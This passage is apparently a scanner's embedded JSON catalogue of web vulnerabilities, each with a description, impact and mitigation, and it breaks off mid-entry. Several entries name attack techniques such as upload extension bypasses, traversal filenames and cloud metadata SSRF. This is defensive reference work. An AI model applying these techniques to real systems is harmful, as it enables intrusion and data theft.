_EMBEDDED_VULN_DETAILS = json.loads('{"SQL Injection (Error-Based)": {"description": "SQL Injection allows an attacker to interfere with the queries that an application makes to its database. Error-based SQLi reveals information about the database structure and data through database error messages.", "impact": "Critical: Data exfiltration, database manipulation, unauthorized access, potential remote code execution.", "mitigation": "Use prepared statements with parameterized queries, input validation (whitelist), least privilege for database accounts, and avoid verbose error messages in production."}, "SQL Injection (Time-Based)": {"description": "Time-based blind SQL Injection relies on the database pausing for a specified amount of time (e.g., using SLEEP()), indicating a successful injection.", "impact": "Critical: Similar to error-based SQLi (data exfiltration, manipulation), but slower to exploit.", "mitigation": "Same as error-based SQLi: prepared statements, input validation, and proper error handling."}, "SQL Injection (Boolean-Based)": {"description": "Boolean-based blind SQL Injection relies on true/false conditions in the database query, causing noticeable content changes or different responses (e.g., length variations) without direct error messages.", "impact": "Critical: Similar to error-based SQLi (data exfiltration, manipulation), but slower to exploit.", "mitigation": "Same as error-based SQLi: prepared statements, input validation, and robust error handling."}, "SQL Injection (UNION-Based)": {"description": "UNION-based SQL injection appends a UNION SELECT statement to the original query to retrieve data from other database tables in the same response.", "impact": "Critical: Direct extraction of sensitive data including usernames, passwords, and confidential records from any table in the database.", "mitigation": "Use parameterized queries and prepared statements. Enforce least privilege on database accounts. Validate and sanitize all input. Disable detailed error messages in production."}, "SQL Injection (Authentication Bypass)": {"description": "An attacker uses SQL metacharacters in the username or password field to bypass authentication logic entirely, without knowing any valid credentials.", "impact": "Critical: Complete authentication bypass, allowing full unauthorized access to the application with administrative privileges.", "mitigation": "Use parameterized queries for all authentication queries. Never concatenate user input into SQL strings. Implement multi-factor authentication."}, "Cross-Site Scripting (XSS)": {"description": "XSS allows attackers to inject client-side scripts into web pages viewed by other users. This can lead to session hijacking, defacement, phishing, or redirection.", "impact": "High: Session hijacking, defacement, phishing, sensitive data exposure, malicious redirects, arbitrary client-side code execution.", "mitigation": "Contextual output encoding for all user-supplied data, Content Security Policy (CSP), input validation, using modern frameworks that handle XSS prevention by default."}, "Cross-Site Scripting (Reflected XSS)": {"description": "Reflected XSS occurs when user-supplied input is immediately returned by a web application in an error message, search result, or any other response that includes some or all of the input as part of the request.", "impact": "High: Execution of arbitrary JavaScript in victim browsers, session theft, credential harvesting, drive-by downloads.", "mitigation": "Encode all output, implement a strict Content Security Policy (CSP), validate and sanitize input on the server side."}, "Cross-Site Scripting (Stored XSS)": {"description": "Stored XSS occurs when malicious script is permanently stored on the target server (e.g., in a database, forum, comment field) and is served to any user who views the affected page.", "impact": "Critical: Persistent attack affecting all users who visit the page, potential for mass account takeover, malware distribution, and defacement.", "mitigation": "Encode all output on every render, implement CSP, sanitize stored data, use context-aware output encoding."}, "Cross-Site Scripting (DOM-Based XSS)": {"description": "DOM-based XSS occurs entirely within the client-side DOM without any server interaction; the attack payload is injected via JavaScript that reads from untrusted sources like location.hash, document.URL, or referrer.", "impact": "High: Session hijacking, credential theft, malicious redirects. Harder to detect as it never reaches the server.", "mitigation": "Avoid using innerHTML, document.write, or eval() with untrusted data. Use textContent instead. Apply DOMPurify for sanitization. Implement a strict CSP."}, "Local File Inclusion (LFI)": {"description": "LFI allows an attacker to include and execute files on the server\'s filesystem, often leading to information disclosure (e.g., /etc/passwd) or remote code execution (if combined with other vulnerabilities like file uploads).", "impact": "Critical: Sensitive file access, source code disclosure, potential remote code execution.", "mitigation": "Avoid dynamic file inclusion. If necessary, use a whitelist of allowed files/paths, strictly validate and sanitize user input for file paths, and implement strong access controls."}, "Remote File Inclusion (RFI)": {"description": "RFI allows an attacker to include and execute a remote file (typically a web shell) hosted on an external server by supplying its URL in a vulnerable parameter.", "impact": "Critical: Remote code execution, complete server compromise, persistent backdoor installation, lateral movement.", "mitigation": "Disable allow_url_include in PHP configuration. Use whitelists for file inclusion. Validate and sanitize all file path parameters. Never include files based solely on user input."}, "Remote Code Execution (RCE)": {"description": "RCE allows an attacker to execute arbitrary commands on the server, potentially leading to complete system compromise.", "impact": "Critical: Complete system compromise, data theft, defacement, pivot to internal network, installation of backdoors.", "mitigation": "Strict input validation and sanitization, avoiding dangerous functions (e.g., eval(), system(), exec()), principle of least privilege, command whitelisting if command execution is necessary."}, "OS Command Injection": {"description": "Command injection occurs when an attacker can supply operating system commands through a vulnerable application parameter that is passed to a shell interpreter.", "impact": "Critical: Arbitrary command execution on the server OS, full system compromise, data exfiltration, lateral network movement.", "mitigation": "Avoid shell execution functions entirely. If unavoidable, use parameterized APIs (e.g., execve) that do not invoke a shell, and apply strict input whitelisting."}, "OS Command Injection (Blind)": {"description": "Blind command injection occurs when the output of the injected command is not reflected in the response. Attackers use time delays or out-of-band techniques (e.g., DNS lookups) to confirm exploitation.", "impact": "Critical: Same as OS Command Injection — full server compromise — though confirmation requires extra effort.", "mitigation": "Same as OS Command Injection. Also implement WAF rules and network egress filtering to limit out-of-band exfiltration channels."}, "LDAP Injection": {"description": "LDAP injection occurs when user-controlled input is incorporated into LDAP queries without proper neutralization, potentially allowing authentication bypass or unauthorized data extraction from the directory.", "impact": "High: Authentication bypass, exposure of sensitive directory information such as usernames, email addresses, group memberships, and passwords.", "mitigation": "Use allowlisted characters for LDAP inputs. Escape special characters in LDAP queries. Use LDAP libraries that support parameterized queries. Apply principle of least privilege to LDAP service accounts."}, "XPath Injection": {"description": "XPath injection occurs when user input is embedded in XPath queries used to retrieve data from XML documents, allowing attackers to bypass authentication or extract data they are not authorized to access.", "impact": "High: Authentication bypass, extraction of sensitive XML data including credentials and configuration.", "mitigation": "Use parameterized XPath queries where possible. Validate and sanitize all input used in XPath expressions. Use a whitelist of allowed values."}, "XML External Entity (XXE)": {"description": "XXE vulnerabilities arise when an XML parser processes external entity references within user-supplied XML. This can lead to disclosure of internal files, server-side request forgery, or denial of service.", "impact": "Critical: Disclosure of internal files (e.g., /etc/passwd), SSRF to internal services, denial of service via recursive entity expansion (Billion Laughs).", "mitigation": "Disable external entity processing in all XML parsers. Use modern libraries that disable XXE by default. Apply input validation and schema-based validation for XML inputs."}, "NoSQL Injection": {"description": "NoSQL injection targets document-oriented databases (e.g., MongoDB) where attacker-controlled operators ($gt, $ne, $where) can manipulate queries, bypassing authentication or extracting data.", "impact": "Critical: Authentication bypass, data exfiltration, privilege escalation depending on the NoSQL engine in use.", "mitigation": "Validate and sanitize all inputs. Avoid using user-supplied input as query operators. Use ORM/ODM frameworks that escape inputs. Disable dangerous operators like $where in MongoDB."}, "Server-Side Template Injection (SSTI)": {"description": "SSTI occurs when user input is embedded in a server-side template (e.g., Jinja2, Twig, FreeMarker) without sanitization. Attackers can inject template syntax to execute arbitrary code on the server.", "impact": "Critical: Remote code execution, full server compromise, access to environment variables, secrets, and internal systems.", "mitigation": "Never pass user input directly into template engines. Use sandboxed template environments. Validate and escape all input before rendering. Prefer logic-less templates where possible."}, "Insecure Direct Object Reference (IDOR)": {"description": "IDOR occurs when an application exposes a direct reference to an internal implementation object (e.g., database keys, filenames, IDs), allowing attackers to manipulate these references to access or modify unauthorized data.", "impact": "Medium: Unauthorized access to sensitive data, modification or deletion of data, privilege escalation.", "mitigation": "Implement robust authorization checks for every request involving an object. Use indirect object references (e.g., UUIDs or hashed IDs) instead of predictable sequential IDs."}, "Server-Side Request Forgery (SSRF)": {"description": "SSRF allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain chosen by the attacker. This can be used to access internal services, bypass firewalls, or attack other systems.", "impact": "High: Access to internal networks/services, bypassing firewall restrictions, port scanning, data exfiltration from internal systems, accessing cloud metadata (e.g., AWS EC2 metadata).", "mitigation": "Input validation (whitelist allowed domains/IPs, schema, ports), disable URL redirects, filter returned responses, authenticate requests made by the server, network segmentation."}, "SSRF (Cloud Metadata)": {"description": "A specific SSRF variant that targets cloud provider instance metadata endpoints (e.g., http://169.254.169.254). Successful exploitation can expose IAM role credentials, tokens, and instance configuration.", "impact": "Critical: Exposure of cloud IAM credentials enabling lateral movement, privilege escalation, and full cloud account compromise.", "mitigation": "Block access to link-local addresses (169.254.0.0/16) at the network and application level. Use IMDSv2 on AWS (which requires a PUT request with a token). Apply SSRF-specific WAF rules."}, "Information Disclosure (Verbose Errors)": {"description": "Application errors or debugging information revealing sensitive system details (e.g., file paths, database schemas, stack traces, internal IP addresses) to an attacker.", "impact": "Medium: Aids further attacks by providing valuable reconnaissance about the server environment, technologies, and potential vulnerabilities.", "mitigation": "Implement custom error pages, disable debugging/verbose logging in production environments, log errors securely on the server side instead of displaying them to users."}, "Information Disclosure (Exposed Server Version)": {"description": "Web server, framework, or application versions exposed in HTTP headers (e.g., Server, X-Powered-By) or page content, which can help attackers identify known vulnerabilities.", "impact": "Low: Facilitates targeted attacks by revealing software versions with known CVEs.", "mitigation": "Remove or obfuscate \'Server\', \'X-Powered-By\', \'Via\', and similar headers. Ensure all software is kept up to date."}, "Information Disclosure (PHP Info)": {"description": "An exposed \'phpinfo()\' page provides a wealth of sensitive configuration information, including PHP version, modules, environment variables, and sometimes database credentials.", "impact": "Medium: High, as it can reveal critical information for further exploitation.", "mitigation": "Never deploy phpinfo.php (or similar scripts like test.php, info.php) on a production server. Ensure they are removed after development/testing."}, "Information Disclosure (Git Config)": {"description": "Exposed \'.git\' directories (e.g., via \'.git/config\' or \'.git/HEAD\') can reveal sensitive repository details, internal network paths, and sometimes credentials used for cloning.", "impact": "Medium: Provides insights into the application\'s development and deployment, potentially leading to source code disclosure.", "mitigation": "Configure web servers to deny access to \'.git\' directories. Ensure deployment processes do not leave \'.git\' folders in the web root."}, "Information Disclosure (.env File)": {"description": "Exposure of \'.env\' files (common in frameworks like Laravel, Symfony, Node.js) can directly lead to the leakage of database credentials, API keys, application secrets, and other critical configuration details.", "impact": "Critical: Often provides direct access to backend systems and services.", "mitigation": "Ensure \'.env\' files are stored outside the web root or configure web servers to explicitly deny public access to them. Use environment variables or secret management services in production."}, "Information Disclosure (Robots.txt)": {"description": "While intended for search engines, a robots.txt file can inadvertently reveal sensitive directories or files that the application developers wish to keep private.", "impact": "Low: Provides reconnaissance for attackers, indicating paths that might contain interesting content.", "mitigation": "Avoid listing sensitive or confidential directories in robots.txt. Do not rely on robots.txt for security."}, "Information Disclosure (Development Artifacts)": {"description": "Exposure of leftover development or configuration files (e.g., .svn/entries, WEB-INF/web.xml, backup files like .bak, .zip) which may contain sensitive information like source code, credentials, or internal configurations.", "impact": "Medium-High: Can expose source code, credentials, internal architecture, and sensitive business logic.", "mitigation": "Maintain strict deployment pipelines that exclude development artifacts. Configure web server rules to block access to version control directories and backup file extensions."}, "Information Disclosure (API Schema Exposure)": {"description": "Publicly accessible API documentation endpoints (e.g., /swagger.json, /openapi.yaml, /api-docs) expose the full structure of the API, including all endpoints, parameters, and sometimes authentication mechanisms.", "impact": "Medium: Greatly accelerates attacker reconnaissance by mapping all available API endpoints and their expected inputs.", "mitigation": "Restrict access to API documentation to authenticated users or internal networks only. Remove or protect these endpoints in production environments."}, "Information Disclosure (Spring Actuator)": {"description": "Spring Boot Actuator endpoints (e.g., /actuator/env, /actuator/mappings) when left exposed, reveal application configuration, environment variables, health status, and all URL mappings.", "impact": "High: Can expose database credentials, secret keys, internal configuration, and a full map of the application\'s functionality.", "mitigation": "Restrict Actuator endpoints to management networks. Disable unused endpoints. Require authentication for all actuator endpoints."}, "Missing Security Headers (X-Frame-Options)": {"description": "The X-Frame-Options header is missing, meaning the page can be embedded in an iframe on an attacker-controlled site, enabling clickjacking attacks.", "impact": "Medium: Clickjacking attacks that trick users into unintentionally performing actions.", "mitigation": "Set \'X-Frame-Options: DENY\' or \'SAMEORIGIN\'. Alternatively use \'Content-Security-Policy: frame-ancestors\' directive."}, "Missing Security Headers (Content-Security-Policy)": {"description": "The Content-Security-Policy header is absent, meaning the browser has no instruction to restrict the sources of scripts, styles, and other resources, increasing XSS risk.", "impact": "Medium-High: Increases the exploitability of XSS vulnerabilities and allows loading of malicious external resources.", "mitigation": "Define and deploy a strict Content-Security-Policy header that whitelists trusted content sources. Start with a report-only policy to tune rules without breaking functionality."}, "Missing Security Headers (Strict-Transport-Security)": {"description": "The Strict-Transport-Security (HSTS) header is missing on an HTTPS site, allowing downgrade attacks where a MITM can redirect the browser to the HTTP version of the site.", "impact": "Low-Medium: SSL stripping and man-in-the-middle attacks possible on subsequent visits.", "mitigation": "Set \'Strict-Transport-Security: max-age=31536000; includeSubDomains; preload\'. Submit to the HSTS preload list for maximum protection."}, "Missing Security Headers (X-Content-Type-Options)": {"description": "The X-Content-Type-Options header is missing or not set to \'nosniff\', allowing browsers to MIME-sniff the content type, which can lead to XSS via uploaded files interpreted as scripts.", "impact": "Low: MIME confusion attacks, potential for XSS via user-uploaded content.", "mitigation": "Set \'X-Content-Type-Options: nosniff\' on all responses."}, "Missing Security Headers (Referrer-Policy)": {"description": "The Referrer-Policy header is absent, causing browsers to send the full URL in the Referer header when navigating away, potentially leaking sensitive URL parameters (e.g., tokens, session IDs).", "impact": "Low: Sensitive data leakage via Referer headers to third-party sites.", "mitigation": "Set an appropriate Referrer-Policy such as \'no-referrer\', \'same-origin\', or \'strict-origin-when-cross-origin\'."}, "Missing Security Headers (Permissions-Policy)": {"description": "The Permissions-Policy (formerly Feature-Policy) header is absent, failing to restrict browser features such as camera, microphone, geolocation, and payment APIs for the page and its embedded frames.", "impact": "Low-Medium: Potential unauthorized access to browser features via malicious iframes or XSS.", "mitigation": "Define a Permissions-Policy header to explicitly deny or restrict access to sensitive browser features that the application does not require."}, "Missing Security Headers (Cache-Control)": {"description": "Sensitive pages lack proper Cache-Control headers, causing browsers or intermediate proxies to cache content that should be private, such as account pages, financial data, or authentication tokens.", "impact": "Medium: Sensitive data exposure to shared computer users or via proxy cache inspection.", "mitigation": "Set \'Cache-Control: no-store, private\' on all pages that return sensitive or authenticated content."}, "Cross-Site Request Forgery (CSRF)": {"description": "CSRF tricks an authenticated user\'s browser into making unintended state-changing requests to the application they are logged into, using the user\'s existing session credentials.", "impact": "High: Unauthorized state changes including password reset, email change, fund transfers, or any action the user is authorized to perform.", "mitigation": "Implement CSRF tokens (synchronizer token pattern) in all state-changing forms. Use SameSite=Lax or Strict cookie attribute. Validate Origin and Referer headers for sensitive endpoints."}, "CSRF (JSON-Based)": {"description": "JSON-based CSRF exploits endpoints that accept application/json content without CSRF token validation, relying on misconfigurations like CORS or content-type-free parsing to submit cross-origin requests.", "impact": "High: Unauthorized state-changing API calls using the victim\'s session.", "mitigation": "Require CSRF tokens or verify Content-Type headers for all state-changing API endpoints. Enforce strict CORS policies with credentials."}, "Authentication Flaws (Weak Credentials)": {"description": "The application allows the use of weak, default, or easily guessable credentials, making accounts susceptible to brute-force or dictionary attacks.", "impact": "High: Account takeover, unauthorized access to sensitive data and functionality.", "mitigation": "Enforce strong password policies, implement multi-factor authentication, use password strength meters, and check new passwords against known-breached password lists."}, "Authentication Flaws (Username Enumeration)": {"description": "The application reveals whether a submitted username is valid or not through different error messages, response times, or status codes, allowing attackers to enumerate valid usernames.", "impact": "Medium: Enables targeted brute-force attacks against known valid usernames.", "mitigation": "Return identical error messages for invalid username and invalid password. Ensure login response times are consistent regardless of whether the username exists."}, "Authentication Flaws (Missing Account Lockout)": {"description": "The authentication endpoint does not implement account lockout or rate limiting, allowing unlimited automated password guessing attempts.", "impact": "High: Credential brute-force attacks can run unimpeded until a password is guessed.", "mitigation": "Implement progressive lockout (e.g., increasing delays), temporary account lockout after N failed attempts, CAPTCHA after threshold, and alert on suspicious login patterns."}, "Authentication Flaws (HTTP Login)": {"description": "Authentication credentials are transmitted over unencrypted HTTP rather than HTTPS, exposing them to network interception.", "impact": "Critical: Credentials can be captured in cleartext by any network observer (e.g., ARP spoofing, rogue WiFi).", "mitigation": "Enforce HTTPS everywhere using HSTS. Redirect all HTTP traffic to HTTPS. Never accept credentials over plaintext connections."}, "OAuth Misconfiguration": {"description": "The OAuth implementation has security flaws such as open redirect_uri validation, missing state parameter, implicit flow misuse, or overly broad scope grants that can be exploited to steal authorization codes or access tokens.", "impact": "High: Account takeover via authorization code theft, cross-site request forgery in the OAuth flow, token leakage, or unauthorized scope access.", "mitigation": "Strictly validate redirect_uri against a pre-registered whitelist. Always implement and validate the state parameter. Use PKCE for public clients. Restrict OAuth scopes to minimum required. Prefer authorization code flow with short-lived tokens."}, "Two-Factor Authentication (2FA) Bypass": {"description": "The application\'s two-factor authentication implementation can be bypassed through techniques such as response manipulation, direct URL access to post-2FA pages, or replay attacks.", "impact": "Critical: Complete bypass of the additional authentication factor, reducing security to single-factor authentication and making accounts vulnerable to credential-based attacks.", "mitigation": "Enforce 2FA completion server-side at every protected endpoint, not just during login. Implement proper session state management to track 2FA completion. Use time-limited, single-use OTP tokens. Test 2FA bypass scenarios explicitly."}, "Session Management Issues (Missing HttpOnly)": {"description": "Session cookies are missing the HttpOnly flag, making them accessible to JavaScript, which allows XSS attacks to steal session tokens directly.", "impact": "Medium-High: Session hijacking via XSS. A single XSS vulnerability can compromise all user sessions if HttpOnly is not set.", "mitigation": "Ensure all session cookies are set with the HttpOnly attribute."}, "Session Management Issues (Missing Secure Flag)": {"description": "Session cookies are missing the Secure flag on HTTPS sites, allowing them to be transmitted over unencrypted HTTP, making them vulnerable to interception.", "impact": "Medium: Session hijacking if intercepted over insecure channels.", "mitigation": "Ensure all session cookies are set with the Secure attribute, especially on HTTPS-only sites."}, "Session Fixation (Basic Check)": {"description": "The application fails to issue a new session ID upon successful user authentication. If an attacker can force a user to use a pre-determined session ID, they can then use that ID to impersonate the user after they log in.", "impact": "Medium: Session hijacking, allowing an attacker to impersonate a legitimate user.", "mitigation": "Generate a new session ID for the user upon successful authentication. Invalidate old session IDs."}, "Session Management (Concurrent Sessions)": {"description": "The application allows multiple simultaneous active sessions for the same user account without alerting the user or enforcing a limit, enabling stealth session hijacking.", "impact": "Medium: An attacker who has obtained a session token can maintain access even after the legitimate user changes their password.", "mitigation": "Optionally limit concurrent sessions. Invalidate all existing sessions when the user changes their password. Alert users of new logins from unknown devices."}, "JWT Security Issues": {"description": "JSON Web Token vulnerabilities including the \'alg:none\' attack (signature bypass), weak secret keys, missing expiration claims, or algorithm confusion attacks allow attackers to forge valid tokens.", "impact": "Critical: Authentication bypass, privilege escalation to any role encoded in the JWT payload.", "mitigation": "Reject tokens with \'alg:none\'. Use a strong random secret (minimum 256 bits) or RS256. Always validate exp, iat, and aud claims. Use a maintained JWT library that enforces security checks."}, "Password Reset Flaws": {"description": "Weaknesses in the password reset flow including predictable reset tokens, tokens that do not expire, tokens that can be reused, or parameters susceptible to tampering allow unauthorized password resets.", "impact": "Critical: Full account takeover without knowing the original password.", "mitigation": "Generate cryptographically random reset tokens. Enforce short expiration (e.g., 15 minutes). Invalidate tokens after single use. Destroy existing sessions after a successful password reset."}, "Insecure Direct Object Reference (IDOR) via API": {"description": "API endpoints accept numeric or predictable IDs in the request body or path without verifying that the requesting user is authorized to access the referenced resource.", "impact": "High: Unauthorized read, modification, or deletion of other users\' data through a simple parameter change.", "mitigation": "Enforce object-level authorization for every API request. Use UUIDs instead of sequential IDs. Implement and test row-level security in the database layer."}, "Broken Access Control (URL Tampering)": {"description": "Improper enforcement of access restrictions, allowing attackers to access unauthorized functionality or data (e.g., by changing URL parameters to access other users\' accounts or admin panels).", "impact": "High: Unauthorized access to sensitive data, administrative functions, or other users\' accounts; data modification or deletion; privilege escalation.", "mitigation": "Implement robust server-side authorization checks for every access to resources and functionality. Do not rely on client-side controls for access decisions. Use principle of least privilege."}, "Privilege Escalation (Vertical)": {"description": "A lower-privileged user can access functionality or data restricted to higher-privileged roles (e.g., a regular user accessing admin functionality) due to missing or misconfigured authorization checks.", "impact": "Critical: Full administrative access, data exfiltration, system-wide configuration changes.", "mitigation": "Implement role-based access control (RBAC) enforced server-side. Audit every privileged endpoint. Log and alert on unauthorized access attempts."}, "Privilege Escalation (Horizontal)": {"description": "A user can access or modify another user\'s data at the same privilege level by manipulating identifiers (e.g., user IDs, account numbers) in requests.", "impact": "High: Unauthorized access to other users\' private data, account details, or financial information.", "mitigation": "Always validate that the authenticated user is the owner of the requested resource. Never rely solely on client-supplied identifiers for authorization."}, "Unvalidated Redirects and Forwards": {"description": "An application uses user-supplied input to perform redirects or forwards without proper validation, allowing attackers to redirect users to malicious sites (phishing) or to internal, unauthorized locations.", "impact": "Medium: Phishing attacks, malware distribution, bypassing security controls, leading to other vulnerabilities.", "mitigation": "Avoid using user-supplied input for redirection targets. If unavoidable, use a whitelist of allowed redirection URLs or ensure proper URL validation."}, "Open Redirect": {"description": "The application redirects users to a URL specified in a request parameter without validating that the destination is within the allowed domain, enabling phishing and token theft.", "impact": "Medium: Phishing attacks, credential harvesting by redirecting users to lookalike sites after OAuth flows or login.", "mitigation": "Validate redirect targets against an allowlist of permitted domains. Reject redirects to external domains by default. Display a warning page for external redirects."}, "Missing Cookie Attributes (HttpOnly/Secure)": {"description": "General vulnerability when any cookie lacks essential security attributes, exposing it to client-side attacks or insecure transmission.", "impact": "Low-Medium: Information disclosure or session hijacking depending on cookie content.", "mitigation": "Set HttpOnly and Secure attributes for all sensitive cookies. Apply SameSite=Lax or Strict."}, "Missing Cookie Attributes (SameSite)": {"description": "The SameSite cookie attribute is missing, making cookies vulnerable to CSRF attacks by default in some browser contexts (e.g., cross-site requests).", "impact": "Low: Increases susceptibility to CSRF attacks.", "mitigation": "Implement the SameSite attribute (e.g., Lax or Strict) for all cookies to mitigate CSRF risks."}, "Clickjacking": {"description": "Clickjacking, or UI redressing, tricks users into clicking on something different from what they perceive by overlaying malicious content, often using iframes.", "impact": "Medium: Can lead to unauthorized actions, account takeover, or data manipulation without the user\'s explicit consent.", "mitigation": "Implement X-Frame-Options: DENY or SAMEORIGIN. Use Content Security Policy (CSP) frame-ancestors directive."}, "Password Brute-Force Weaknesses": {"description": "Lack of protective measures (e.g., rate limiting, account lockout, CAPTCHA) against automated attempts to guess passwords on authentication mechanisms.", "impact": "High: Account takeover by guessing valid user credentials.", "mitigation": "Implement rate limiting for login attempts, account lockout after a few failed attempts, CAPTCHA mechanisms, and monitor for suspicious login activity."}, "File Upload Vulnerability (Basic Detection)": {"description": "Detection of file upload functionality without attempts to exploit it. Such forms can be vulnerable to malicious file uploads (e.g., web shells) if not properly secured.", "impact": "High: Potential for remote code execution, denial of service, or data manipulation if not properly secured.", "mitigation": "Strictly validate file types (whitelist), rename uploaded files, store files outside web root, scan for malware, implement size limits, and consider disabling script execution in upload directories."}, "File Upload (Extension Bypass)": {"description": "An attacker bypasses client-side or server-side file extension checks by using double extensions (shell.php.jpg), null bytes (shell.php%00.jpg), or alternative extensions (shell.phtml, shell.php5) to upload executable scripts.", "impact": "Critical: Remote code execution via uploaded web shell, full server compromise.", "mitigation": "Validate file types by magic bytes in addition to extension. Use a whitelist of allowed extensions. Store uploads outside the web root. Rename uploaded files. Disable script execution in upload directories."}, "File Upload (Content-Type Bypass)": {"description": "An attacker manipulates the Content-Type header in the upload request to make a PHP/ASP shell appear as an image, bypassing server-side validation that only checks the MIME type.", "impact": "Critical: Remote code execution, full server compromise.", "mitigation": "Do not rely on Content-Type header for file validation. Re-validate MIME type server-side using magic byte inspection. Apply multiple layers of validation."}, "File Upload (Path Traversal via Filename)": {"description": "A malicious filename containing path traversal sequences (e.g., ../../shell.php) allows the attacker to write files to arbitrary locations on the server\'s filesystem.", "impact": "Critical: Overwrite of critical files, placement of web shells in executable directories, potential full server compromise.", "mitigation": "Sanitize and normalize filenames before saving. Strip path separators and traversal sequences. Generate server-side filenames rather than using user-supplied names."}, "CORS Misconfiguration": {"description": "The application\'s CORS policy is too permissive (e.g., reflecting arbitrary origins, allowing null origin, or using wildcard with credentials) allowing attacker-controlled origins to make authenticated cross-origin requests.", "impact": "High: An attacker\'s malicious site can make authenticated API requests on behalf of a logged-in victim, exfiltrating sensitive data or triggering state-changing operations.", "mitigation": "Validate the Origin header against a strict whitelist of trusted domains. Never reflect arbitrary origins. Never combine Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true."}, "Host Header Injection": {"description": "The application trusts the Host header without proper validation, potentially allowing an attacker to inject arbitrary domain names, leading to password reset poisoning, web cache deception, or routing attacks.", "impact": "Medium-High: Password reset link poisoning (attacker receives victim\'s reset link), web cache poisoning, server-side confusion, or redirection attacks.", "mitigation": "Always validate the Host header against a whitelist of allowed domains. Do not use the Host header directly in redirects or links without sanitization."}, "Web Cache Poisoning": {"description": "An attacker poisons a shared cache (CDN, reverse proxy) by injecting unkeyed inputs (e.g., X-Forwarded-Host, X-Original-URL) that influence the response content but are not included in the cache key.", "impact": "High: Persistent delivery of malicious content to many users from a trusted cache, XSS at scale, phishing.", "mitigation": "Audit and restrict which headers are reflected in responses. Configure caches to include all security-relevant headers in the cache key. Disable caching for dynamic, personalized responses."}, "Subdomain Takeover": {"description": "A DNS entry (CNAME) points to an external service (e.g., GitHub Pages, Heroku, AWS S3) that no longer exists. An attacker claims the service and serves content from the organization\'s subdomain.", "impact": "High: Phishing attacks against the organization\'s users, cookie theft if the subdomain shares a parent domain, CSP bypass.", "mitigation": "Audit all DNS records regularly. Remove CNAME entries pointing to decommissioned services. Monitor for dangling DNS records using automated tooling."}, "GraphQL Introspection Enabled": {"description": "The GraphQL introspection endpoint is enabled in production, allowing anyone to query the full schema and discover all available types, queries, mutations, and their arguments.", "impact": "Medium: Complete API reconnaissance, revealing hidden endpoints and data models that simplify targeted attacks.", "mitigation": "Disable GraphQL introspection in production environments. If required for internal use, restrict it to authenticated administrators."}, "GraphQL Authorization Bypass": {"description": "GraphQL resolvers lack proper authorization checks, allowing authenticated users to access other users\' data or perform privileged mutations by crafting specific queries.", "impact": "High: Unauthorized data access or modification, privilege escalation, similar impact to IDOR but via GraphQL resolvers.", "mitigation": "Implement object-level and field-level authorization in every resolver. Reject queries accessing data the authenticated user does not own."}, "WebSocket Authentication Bypass": {"description": "WebSocket connections lack proper authentication validation during the upgrade handshake or on subsequent messages, allowing unauthenticated or cross-origin message injection.", "impact": "High: Unauthorized access to real-time functionality, message injection, data exfiltration.", "mitigation": "Validate authentication tokens during the WebSocket handshake. Reject connections from disallowed origins. Apply message-level authorization for sensitive operations."}, "WebSocket Message Tampering": {"description": "The application accepts WebSocket messages and processes them without server-side validation, allowing an attacker to tamper with message content to manipulate application state or inject malicious data.", "impact": "High: Business logic bypass, privilege escalation, injection attacks via WebSocket messages.", "mitigation": "Validate and sanitize all WebSocket message data server-side. Apply the same authorization and input validation rules as HTTP endpoints."}, "SAML Vulnerabilities": {"description": "Weaknesses in SAML implementation including XML signature wrapping attacks, XXE via SAML, AssertionConsumerServiceURL tampering, or missing signature validation allow authentication bypass or impersonation.", "impact": "Critical: Full authentication bypass, impersonation of any user including administrators.", "mitigation": "Use a maintained SAML library that enforces signature validation by default. Validate the ACS URL against a whitelist. Disable external entity parsing in the XML parser."}, "Autocomplete Enabled on Sensitive Forms": {"description": "Sensitive form fields (passwords, credit card numbers, personal information) have autocomplete enabled. This allows browsers to store and suggest sensitive values, potentially exposing them to other users on shared computers.", "impact": "Low: On shared or compromised machines, stored autocomplete data can be accessed by other users or malicious software.", "mitigation": "Add autocomplete=\\"off\\" to sensitive form fields and forms. For password fields, use autocomplete=\\"current-password\\" or autocomplete=\\"new-password\\" as appropriate. Educate users about browser security on shared devices."}, "Outdated Libraries or Plugins (Detected via Headers)": {"description": "The application\'s HTTP headers (e.g., X-Powered-By, Server) or content indicate the use of outdated versions of frameworks, libraries, or server software that may contain known vulnerabilities (CVEs).", "impact": "Medium: Increases the attack surface by exposing components with publicly known security flaws.", "mitigation": "Regularly update all third-party libraries, frameworks, and server software. Subscribe to security advisories. Obfuscate or remove version-revealing headers in production."}, "Weak Password Policy (Generic Check)": {"description": "Detection of a login form suggests the need for a strong password policy. Absence of robust policies (e.g., minimum length, complexity requirements, prevention of common passwords) makes accounts susceptible to guessing or dictionary attacks.", "impact": "Medium: Account takeover through weak or easily guessable passwords.", "mitigation": "Enforce strong password policies: minimum length (e.g., 12+ chars), complexity (mixed case, numbers, special chars), disallow common passwords, and encourage password managers."}, "HTTP Methods Enabled (PUT/DELETE/OPTIONS)": {"description": "Dangerous HTTP methods (e.g., PUT, DELETE, TRACE, OPTIONS, OPTION) are enabled on the web server, which, if misconfigured, can allow attackers to upload or delete files on the server.", "impact": "Medium: Can lead to data destruction, defacement, or remote code execution if combined with other flaws.", "mitigation": "Disable unnecessary HTTP methods on web servers. Only allow methods required for the application\'s functionality (typically GET and POST)."}, "HTTP Host Header Attack (Basic)": {"description": "The application uses the HTTP Host header value in application logic (e.g., password reset links, redirects) without proper validation. Attackers can manipulate this header to poison caches, redirect users, or trigger SSRF.", "impact": "Medium to High: Can lead to cache poisoning, password reset link hijacking, SSRF, or web application firewall bypass.", "mitigation": "Validate the Host header against a whitelist of allowed values. Configure the web server to reject requests with unexpected Host headers. Do not use the Host header for sensitive operations like generating password reset URLs; use hardcoded base URLs instead."}, "Business Logic Flaw (Price Manipulation)": {"description": "The application allows client-side manipulation of price or quantity values, enabling attackers to purchase items at unintended prices (e.g., negative prices, zero values, or dramatically reduced costs).", "impact": "High: Direct financial loss to the organization. Attackers can acquire products or services without proper payment.", "mitigation": "Always enforce price and business logic calculations server-side. Never trust price or discount values submitted by the client. Implement server-side validation that recalculates totals from the product catalog before processing payment."}, "Business Logic Flaw (Coupon/Voucher Reuse)": {"description": "The application allows a single-use coupon code to be applied multiple times within a single transaction, in parallel requests, or across multiple accounts due to a race condition or missing server-side tracking.", "impact": "High: Financial loss, abuse of promotional offers.", "mitigation": "Mark coupons as used atomically in the database. Implement database-level unique constraints on coupon usage. Use idempotency tokens to prevent parallel redemption."}, "Race Condition": {"description": "A time-of-check to time-of-use flaw where parallel requests can bypass single-use restrictions or 